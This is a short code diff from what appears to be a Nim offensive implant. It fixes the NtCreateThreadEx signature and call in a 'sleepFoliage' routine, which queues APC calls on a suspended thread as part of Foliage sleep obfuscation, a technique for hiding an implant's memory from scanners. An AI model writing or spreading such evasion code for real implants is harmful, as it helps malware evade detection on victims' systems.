@@ -43,7 +43,7 @@ type
     NtSetEvent = proc(hEvent: HANDLE, previousState: PLONG): NTSTATUS {.stdcall.} 
     NtDuplicateObject = proc(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.stdcall.} 
     # Foliage 
-    NtCreateThreadEx = proc(threadHandle: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, processHandle: HANDLE, startRoutine: PVOID, argument: PVOID, createFlags: ULONG, zeroBits: ULONG, stackSize: ULONG, maximumStackSize: ULONG, attributeList: PVOID): NTSTATUS {.stdcall.} 
+    NtCreateThreadEx = proc(threadHandle: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, processHandle: HANDLE, startRoutine: PVOID, argument: PVOID, createFlags: ULONG, zeroBits: SIZE_T, stackSize: SIZE_T, maximumStackSize: SIZE_T, attributeList: PVOID): NTSTATUS {.stdcall.}
     NtGetContextThread = proc(threadHandle: HANDLE, context: PCONTEXT): NTSTATUS {.stdcall.} 
     NtQueueApcThread = proc(threadHandle: HANDLE, apcRoutine: PPS_APC_ROUTINE, apcArgument1: PVOID, apcArgument2: PVOID, apcArgument3: PVOID): NTSTATUS {.stdcall.} 
     NtAlertResumeThread = proc(threadHandle: HANDLE, suspendCount: PULONG): NTSTATUS {.stdcall.} 
@@ -489,7 +489,7 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int, hWakeupEvent: 
         defer: CloseHandle(hEventSync)
             
         # Start suspended thread where the APC calls will be queued and executed
-        status = apis.NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL)
+        status = apis.NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0, 0, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, status.getNtError())
         print fmt"[*] [{hThread.repr}] Thread created "
